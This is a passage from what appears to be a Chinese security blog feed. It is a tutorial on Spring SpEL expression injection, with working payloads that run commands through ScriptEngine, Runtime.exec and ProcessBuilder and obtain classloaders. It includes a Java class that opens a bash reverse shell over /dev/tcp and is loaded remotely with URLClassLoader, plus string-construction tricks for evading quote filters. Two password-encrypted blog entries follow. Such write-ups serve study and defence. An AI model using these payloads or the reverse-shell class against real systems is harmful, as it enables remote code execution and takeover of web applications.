(ScriptEngineFactory factory: factories)&#123;<br>                System.out.printf(<br>                    <span class="hljs-string">&quot;Name: %s%n&quot;</span> + <span class="hljs-string">&quot;Version: %s%n&quot;</span> + <span class="hljs-string">&quot;Language name: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Language version: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Extensions: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Mime types: %s%n&quot;</span> +<br>                    <span class="hljs-string">&quot;Names: %s%n&quot;</span>,<br>                    factory.getEngineName(),<br>                    factory.getEngineVersion(),<br>                    factory.getLanguageName(),<br>                    factory.getLanguageVersion(),<br>                    factory.getExtensions(),<br>                    factory.getMimeTypes(),<br>                    factory.getNames()<br>                );<br>        &#125;<br> &#125;<br></code></pre></td></tr></table></figure><blockquote><p>  Name: Oracle Nashorn<br>  Version: 1.8.0_261<br>  Language name: ECMAScript<br>  Language version: ECMA - 262 Edition 5.1<br>  Extensions: [js]<br>  Mime types: [application/javascript, application/ecmascript, text/javascript, text/ecmascript]<br>  <strong>Names: [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</strong></p></blockquote><p>通过结果中的Names，我们知道了所有的js引擎名称故getEngineByName的参数可以填<code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code>,举个例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">sem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>();<br><span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> sem.getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>);<br>System.out.println(engine.eval(<span class="hljs-string">&quot;2+1&quot;</span>));<br></code></pre></td></tr></table></figure><p>那么payload也就显而易见</p><p><code>nashorn</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>javascript</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(<span class="hljs-string">&quot;s=[2];s[0]=&#x27;open&#x27;;s[1]=&#x27;/System/Applications/Calculator.app&#x27;;java.lang.Runtime.getRuntime().exec(s);&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065405-5cc4be22-77bc-1.jpg" alt="image-20210224055228307"></p><p>OK基础的第一部分到此结束</p><h2 id="RCE第二部分"><a href="#RCE第二部分" class="headerlink" title="RCE第二部分"></a>RCE第二部分</h2><p>下面开始第二部分 , 思路 : 反射构造RCE ，下面反射中用到的类包括但不限于上述部分</p><p>首先简单介绍反射 :</p><p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065406-5cf488aa-77bc-1.jpg" alt="image-20210224040143681"></p><p>然后简单介绍ClassLoader :</p><p> JVM(java虚拟机) 拥有多种ClassLoader, 不同的 ClassLoader 会从不同的地方加载字节码文件, 加载方式可以通过不同的文件目录加载, 也可以从不同的 jar 文件加载，还包括使用网络服务地址来加载。几个重要的 ClassLoader : <code>BootstrapClassLoader</code>、<code>ExtensionClassLoader</code> 和<code>AppClassLoader</code>、<code>UrlClassLoader</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210308194850-3fc51a2e-8004-1.jpg" alt="ClassLoader" title="ClassLoader"></p><p>下面构造会用到<code>AppClassLoader</code>和<code>UrlClassLoader</code></p><h3 id="04-UrlClassLoader"><a href="#04-UrlClassLoader" class="headerlink" title="04 : UrlClassLoader"></a>04 : UrlClassLoader</h3><blockquote><p>  URLClassLoader 可以加载远程类库和本地路径的类库</p></blockquote><p>调用思路 : 远程加载class文件，通过函数调用或者静态代码块来调用</p><p>先构造一份Exp.jar , 放到远程vps即可</p><p>一份通过构造方法反弹shell的Exp.java实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exp</span><span class="hljs-params">(String address)</span>&#123;<br>        address = address.replace(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span>+address+<span class="hljs-string">&quot;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            p.start();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>起一个http服务示例</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python -m SimpleHTTPServer 8990<br></code></pre></td></tr></table></figure><p>Payload</p><p>注意必须使用全限定类名 , 或许这个可以过一些bypass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;127.0.0.1:2333&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065406-5d4cad6e-77bc-1.jpg" alt="image-20210224033722685"></p><h3 id="05-AppClassLoader"><a href="#05-AppClassLoader" class="headerlink" title="05 : AppClassLoader"></a>05 : AppClassLoader</h3><blockquote><p>  AppClassLoader 直接面向用户,它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录</p><p>  由于双亲委派的存在,它可以加载到我们想要的类</p></blockquote><p>使用的前提是获取 , 获取AppClassLoader可以通过ClassLoader类的静态方法<strong>getSystemClassLoader</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(ClassLoader.getSystemClassLoader());<br></code></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065406-5d6c7c20-77bc-1.jpg" alt="image-20210226053613761"></p><ul><li><p>加载Runtime执行</p><p>  由于需要调用到静态方法所以还是要用到<code>T()</code>操作</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(ClassLoader).getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;open /System/Applications/Calculator.app&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>加载ProcessBuilder执行</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(ClassLoader).getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructors()[<span class="hljs-number">1</span>].newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure></li></ul><h3 id="06-通过其他类获取AppClassLoader"><a href="#06-通过其他类获取AppClassLoader" class="headerlink" title="06: 通过其他类获取AppClassLoader"></a>06: 通过其他类获取AppClassLoader</h3><p>这里我新开一个标题原因是在实际的web项目开发者会导入很多依赖的jar，或编写自定义类</p><p><strong>实例1:</strong></p><p>使用spel的话一定存在名为org.springframework的包，这个包下有许许多多的类，而这些类的classloader就是app</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065407-5dd26f30-77bc-1.jpg" alt="image-20210226054533360"></p><p>比如:org.springframework.expression.Expression类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println( org.springframework.expression.Expression.class.getClassLoader() );<br></code></pre></td></tr></table></figure><p>那么很容易就可以得到一个获取AppClassLoader的方法 ,  </p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">springframework</span>.<span class="hljs-params">expression</span>.Expression)</span>.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">ClassLoader()</span><br></code></pre></td></tr></table></figure><p>假设使用thyemleaf的话会有org.thymeleaf.context.AbstractEngineContext:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">T(<span class="hljs-params">org</span>.<span class="hljs-params">thymeleaf</span>.<span class="hljs-params">context</span>.AbstractEngineContext)</span>.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">ClassLoader()</span><br></code></pre></td></tr></table></figure><p>假设有一个自定义的类那么可以:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(com.ctf.controller.Demo).getClass().getClassLoader()<br></code></pre></td></tr></table></figure><p>类比较多，不过多叙述</p><h3 id="07-通过内置对象加载UrlClassLoader"><a href="#07-通过内置对象加载UrlClassLoader" class="headerlink" title="07: 通过内置对象加载UrlClassLoader"></a>07: 通过内置对象加载UrlClassLoader</h3><p>这里在<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&idx=1&mid=2650174018&sn=94cd324370afc2024346f7c508ff77dd" title="0c0c0f">0c0c0f</a>18年的一个文章学到了两个poc，部分截图如下<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210309094343-e175796c-8078-1.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;request.getClass().getClassLoader().loadClass(\<span class="hljs-string">&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;touch/tmp/foobar\&quot;)&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">username[#this.getClass().forName(&quot;</span>javax.script.ScriptEngineManager<span class="hljs-string">&quot;).newInstance().getEngineByName(&quot;</span>js<span class="hljs-string">&quot;).eval(&quot;</span>java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&#x27;xterm&#x27;</span>)<span class="hljs-string">&quot;)]=asdf</span><br></code></pre></td></tr></table></figure><p>request、response对象是web项目的常客,通过第一个poc测试发现在web项目如果引入了spel的依赖，那么这两个对象会自动被注册进去。</p><p>像这样，会发现它调用的是UrlClassLoader<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065407-5df5e8c0-77bc-1.jpg" alt="url"></p><p>第二个poc则是使用了<code>this</code>关键字来加载也很是巧妙</p><p>也可以获取UrlClassLoader</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210309102335-73511d32-807e-1.png" alt="this" title="this"></p><h3 id="08-字符串-bypass"><a href="#08-字符串-bypass" class="headerlink" title="08: 字符串 bypass"></a>08: 字符串 bypass</h3><p>引号被过滤不可以直接使用字符串，这里提供三种构造字符串的方法</p><p>1.<code>T(类名).getName()</code>会返回字符串类型的全限定类名</p><p>比如:<code>[[$&#123;T(String).getName()&#125;]]</code>结果为java.lang.String</p><p>然后我们就可以使用角标来构造我们想要的字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">[[$&#123;T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">51</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">122</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">104</span>)+T(String).getName()[<span class="hljs-number">0</span>].replace(<span class="hljs-number">106</span>,<span class="hljs-number">49</span>)&#125;]]<br>#回显h3zh1<br></code></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065408-5e554ed2-77bc-1.jpg" alt="image-20210224051129248"></p><p>2.使用Character类构造字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">[[$&#123;T(Character).toString(<span class="hljs-number">104</span>)+T(Character).toString(<span class="hljs-number">51</span>)+T(Character).toString(<span class="hljs-number">122</span>)+T(Character).toString(<span class="hljs-number">104</span>)+T(Character).toString(<span class="hljs-number">49</span>)&#125;]]<br></code></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065408-5e720cde-77bc-1.jpg" alt="image-20210226063423691"></p><p>3.外部可控字符绕过</p><p>通过web请求构造字符串,request有很多方法返回值为String也有String[]用来给getMethod或者getDeclaredMethod的方法定制参数</p><p><strong>post方法构造字符串</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">51</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">122</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">80</span>,<span class="hljs-number">49</span>)<br></code></pre></td></tr></table></figure><p><strong>get方法构造字符串</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">51</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">122</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">104</span>)%2b#request.getMethod().substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>).replace(<span class="hljs-number">71</span>,<span class="hljs-number">49</span>)<br></code></pre></td></tr></table></figure><p><strong>外部的cookie绕过</strong></p><p><code>[[$&#123;#request.getRequestedSessionId()&#125;]]</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210226065408-5e8312b8-77bc-1.jpg" alt="image-20210224054758847"></p><p><strong>参考 :</strong></p><p>Ruilin 由浅入深SpEL表达式注入漏洞 : <a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p>EL : <a href="https://www.runoob.com/jsp/jsp-expression-language.html">https://www.runoob.com/jsp/jsp-expression-language.html</a></p><p>SpEL : <a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions">https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions</a></p><p>SpringSpel注入漏洞利用 : <a href="https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;idx=1&amp;mid=2650174018&amp;sn=94cd324370afc2024346f7c508ff77dd">https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;idx=1&amp;mid=2650174018&amp;sn=94cd324370afc2024346f7c508ff77dd</a></p><p>DDCTF-2020-WEB-WriteUp : <a href="https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/">https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>认识AspectJWeaver</title>
    <link href="/2021/03/11/javasec/%E8%AE%A4%E8%AF%86AspectJWeaver/"/>
    <url>/2021/03/11/javasec/%E8%AE%A4%E8%AF%86AspectJWeaver/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="abcc9bd0540c61197fb860492360ac8fbbd87cd065846bb0b3a1ef46776d0523"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AntCTF记录</title>
    <link href="/2021/03/07/javasec/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%8DAntCTF%E7%9A%84rmi/"/>
    <url>/2021/03/07/javasec/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%8DAntCTF%E7%9A%84rmi/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="23726552917237a43ce38e1b1fbf1825161447a55c31b82da93b18e6fb9951c4">fc1ca7383e83bf4ec6324ab19e3368d5b0c4506661a1f62e4a13f3c4de39bb79a8af2fee68b81dbb362bfcbe556c445014bdb2bcc0bd8d02e62414b2dc6ed70bbd105740a7b06a51d02906f0f0960495561e381e237b9776f79d333f5a35054a29be39650540f65cfa1a29a0796f5e6a7d7ce75afafebe40c8cd8d4b6c2f85b8e73fab65784229e3a59153270ed610afa811064289c781b6be66a2dfd1e2182d4d3d87e1c222e987784ad1754ae17ae2f18124aa922bcb540600813925f79dcfe0b9e4743c14bd8abdd27cda68df88dadb6aa0ad6ca5b38240c841f380b8808abae5b746c19cc7748fb48ed3b839dce804bfab72fec7fbc1d1e92ceaa9cd21196450f5b8e233c5184c63a6070a14049c1156fc93982b3d8bc95a95098b467ff346d01b0328f1a971470d77246601e1290e8fcf4d1f1469075c9093a2b907d76563a5824398fce9a7764743326300bd7fbe4f8f92edbe82e6d8692337d861bf713235d09c1f5688f72c28d26b5256d88c2e31ebca4f147a4224ba38d3bcfb4c431cd7d4963e832ec755c43bc324f449e83ce877e22fc98dad03726805079a168a4e2bda0abe37bbc5f2d1a6fe51fa55bac769ed512f65c9119917091327d37c1e557c6c0b054ba6df0fbfccb9061b2b93bd36943e88f657dbbfea98c856ad89eb264ed20fff2bf0dd2f886230ea408e71841ef0684a6fb1dfa3713c9532ef29b6356737d6c79812f4307f0523147acedb539065e88a29981d90ed5422c09f97c47224ba13934d04a27e416b69e92a2810a13c126df30936054ddf92849f284c7c5444962b1aebbf8a67d6015d2643be50b80deeabd025695770583bee46acd2010330d8706c9bd7f94d3519a6f7f535aa333c9e735f9e305b4ba0a2ac88fdf8a95adfc4104c8e64f761fc410829b02e80b6011f2f98e304602483e4eb0b9f7bdfd211778515d3bfaad03997fa62833974e80910089a82503f3f97605afd14dbd6e7c2236d8f615b6a54371b70a5100270e1287e76f237e21d94da87a4f39bc12f95c3eeb92fda9dca133157ac99ba7aedc260dd792f142832280dc5af9e262ebf18f885fa8676ece596a0893a5ce00a65c4735edc6f05042bd21373a16811463d9fd265dc1de77d3425e70d16ecc760d9a2c70f867e161b46a9878ce6e2e65baebc48760983ebe0b6f5d0f91073568380edf7ff13ef3a9e3e19a32442f669472eb1a410208dd3e684e2ff8a8d5aa9a64966c62ab2d369cbfc4b591f80e23d24fa5c1c5bccdb77113f8e5735da31a5c857b7e483a970275d130e475aa9e310968dfe0fb8008c25d47ed6906e06f18521f032137354db7ad4489499da44cf63f880dd42e99a7091dc18db13845da28edde28ec37d531a094b8f53dd563de9a3d69afd17b389fce2d62abbbe874f89487f73184a5788d5b5f0d624ce70b795cf45278dd92fd1baff0329ce6a2f24e794b86a3dfeb714c33b6930caf5236742cff36f0f6662699a35907157531f066b4c932070cfeffc6780a5c4a0228c90081c47c9f101cb2a7d915ab4832d397df0f142877d7c0ab21791e941d368d01ff4e7dec2719508aa51dd3cbde9626f65c5454bee5b0ee4d4e27ec55a0a4292c008564710524bee8a32d5627874868c3af700fc6e68e6cc02f27623b75b09264ccc41626c56e4e7b98078d016e28e2f4b49872d429faf86e3b3bc07d2b619a154f20505c7f0cd13b149508c570a8b071200e77a692cd5eb0bf496e90801944d64dc45239dc5959db9add71967e7fe4a404578f7e4898f27dae8e55dcf1a3ecec761575bbfb3dfa524b8a7a91fcceda92a7495dfcccb36fc22623e28dfab1c23c38f2a6ff6e140d99a5ac0945f9c647279c577c829dbe84e7f3eafc52a747a88d8dc7e556465c7b51a2145a886e3668ae26f8470d4dcbcbc895e66ad8d4a31f63fcc0b38ee07f09c53bbadabaa81dc3ac5cfbae315a6db7c7e6d9d3d86b4e75f67ba483bc03a6284b96bbe6ed1257bcd58a7af75f2fd02a0ecf1fff7647d0c162fac4fa872ec7be814ce72cf6a79222b26cb5cc3ddb694244564f3cde0cfc1b3ee37189d93bee6d5de937f53081960509ba97c7ce63549f9c65e35b006617c5ff104cad6e93ca5bcf8629c721c992074292fd8c702e2199be068af982b5545cfe5e210597c5adff4be218fe693b94eca339034ed413a7f29b99ea5eba82e19b7335161b2d2c1418adbbc085d27271bd9e64c1246707c50894a3a68105248df8f1d66acec7269614a849f0b8a781f4339bdb7007ffce121dd0c02a8ad3144b1b935255c946047ee4c9abb204426f4da33ed526782ae1f659fca082a57708528c58dd818651f9118d7ad9a5856ae40b53dc552eb3413b2ffc00a3113c748240cd59bcc502e7a1fc14cc86591ae69290f0e614b30554fed4782c7f4b640a3ee40d2e575f3f54a74fccf20a7a55020efe9b4ff8f7d715f113e65906b4b158d461a7e8b8b417e66e8589b338a31e019740b8d8dd43375e41e571ead8d7898df535e2d50e814bfa27ccc314398e778530cdf44542803e580c9eea36da0351f12a4e7881ebfb2c3e69d45c6b5307b0933a98f2085e5d7ee7355258bd61367df4d2c3a5c0088b6f6a856d8875aa0dd9ac3a065d63f930efaa0203c86de00f48bf5b720c79457982c1ae5b5b3efbdd5dd12996a8523352d5c9dfb79a7df6bf9dda1016997b2118cd398ac7207353541c85d1b544bf5fe335a44320769b5c37eef9eee87d8a7ed7abdfb681254b48d835cf22521f24fa2e94a0a5df3f5c406d93d1565a395da26d696490f1c8e3cbcb925cdd6536f529ba7976fa3de191a9a0dec80f22b2e7ff733fc3762bda23ea71db0d7ed2dc49ed738be3ea2761fe5967f800aa6aa3b2f16d32ecb8ecec331edb2aa314b6610f1fa6f8ad79dcac6ca164b359612791e7601a20355ad59d9ec6619c2e75f0ce6ed33a4064a9d3aad609051f2027495aa3b718307228734a68336647458e0252c316f8a708efcb899a165e37dfed300d68fc45cfe1bec50a37164b7a8d2c9a827a04aa885f8c622536a71e0e0841b0c95e767abb3d5ccd9236c07cab940d6d77d9f7047d2fd551ff5ad63b326df7da8708d42af4bfb09a5758cc061dd1368ab1e682f65622a1277a4e94d51efe592e7634040941649783968dbc4b3ad31900de3957898f0234ad496a2e9f9061ba2abc4d1d9d81aa51ffc849b32e51d59387c0ee594ea5e1e07ef5f11343e8013b5a62d3d66e7bef7ef02a7a86dabc8c5cd86c246aad92429b13b73c85ad252180bd1b43f42d0cc227485680c578be7123483b4f2b81709ba6c9d9ba106c70237afc01fbada18c0c4715ebbb4dd1fdef812ae2e789e997b751e4e42695682203036143f7a6a418d2d845dea05afe0ac5591b3a0f43f7391a32ab6ea235116f41ea173e40b602495e88ccf0f0d70038730573171e5bef2fe634e0b01349a82fb802603afa16f2147d06d604423e634fee1f313dd23552e3a2a79fe0a5d3bf7b828fea8159d3187f880a62ec557e104a43178ba0172618b8c201db497893e198ec35b521cc580b0ce495c0bf99866721a3c724933770e239630ee20ee91d923594bcd935f04034fc181f2f8834b75d320b58e36288ae26fef49c5f0973cc6fafcf9079ca412966a83c9d73375b58135de51a9694c64ea11a2ee957a260b38b14a8a1b01d2a6e62c80b8f8d3312d22c5a822c7ddfaa1da3faa8ccef18009872b71c3f38cde2490690ee50ab7df7ca1680d0ddaa34f7d26408e87fc6c17e1fae1be7f4e77da45de9376900ca2bfcbf3124cf9730fd334f6970bf90deb618afecad8b0b471ea021f3278b131921ca5c510c908a4d85d9488eeb713c8f600384f4ce7724542f1083d06834255321ef83764e2d4d1104754b217756d9fcd0d3ec714f8d02157c8dea0765ac37ab26fe649f76bd3dd0a899816aab272702385ae2b9aae78b21e1aa56c70948f46de93a23a306271499af6209af5ed49500fe8a48f63d4dc612b2f634a7a93bc310f95267a21dfa3250ca325baa292c2e004b0d2721cdca5a83a1e18990270e5eb0003f6039f47c866027fb0328c906dce63deb4d640c5f41d27a8070bd22ff1471015c62bbd7c56a61b2d9bfdbc6949fd5ca6e670ed0e9879fb6541bef021b68abd8e402d994e8de85d8205e5eea6cd7106ee85ea755203302b4526ed96d904da1df62e04d0cdcb13634b50f7efea22830e3f1b96c8a4601163cb49deefa479b794f2497d1e02e63517c125a38aaf44b3b391c84167074be7a232ae95c226ad62f184cc09d5e8f1a7ab00dffec78fd1ac132314ace50653f5dc2816b5223672162aa0c497bc8c5fb8d13e9d3833478f253778d9ff2a230556d3d0685439bede4d6cfc6e9304e839a9be34bacac5920ed52dc5fc7913bbeb6a1d6977d649c19520d6f15951caa19d31dc51500db552710f279e54394bab10977d5dfd008201c4db3e2d05f6aed8bbf6997c2ae51d8a3e064b7b907251ea3b4603cc536f9ac2d632f7b1a1678aa3a5817617cbd8f10d2d02d48ad0f83ac1df7c3e859d5e841fecb06b9e37c59ac80994d04dbf5b3b27620102bab957ac1ee46d585dd1a1a86310186d28780bfe585cad2861425063630484c3db465bcf9aa8c709dc635b1747d7a832dd5db4bd9cb556e03547468c0cb793e1922d43da5dbbad7eb50dd8b0f90a7808369fb027e08c5542f6cf8f43b9511588381f35feeef0cd15de33defdea8cdf3b387773bf8d50d905a1dc96a79e40530454111515cc8b5008bd48e57f37217272fb696f3ecdae4156aa50c897c7a4c4538f6df281f341e122f79a098d0f3202ca7e062efe2b90b7f7ee15d08f7afa2c84e6fb0b3b3138452a51bb161a0d5d0fe0b78d98095cb2376a6163d7e463c727113f230c1ccdfaeb2e25564448be058356544eb64c689fccf7eebc86f7e515e2f5c1d50c83dddea85b657ee67c4fb918d82e950da111c5d38cf3091d313fccae145ee1abb5c6bc0ff213c0c226cf1dea7e2619177deaf0904c6710139e219abf61efb678960faaff39b79e0332e6158db4be2287be04c098bdd844ed090604dd1e92609bbe0250831b8474a69aad6ea704f9fbda26796f866d4b25fece5e6da5b2c47c2f96115713682844638c724230ab8ccffaed703cdb1201a8eceb5b2795678b2eee340b81f1268863837ace7ec64e741010222b43e84469c83cb9a41d36d57d484f4fd969bb76e46b54aaa439</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe 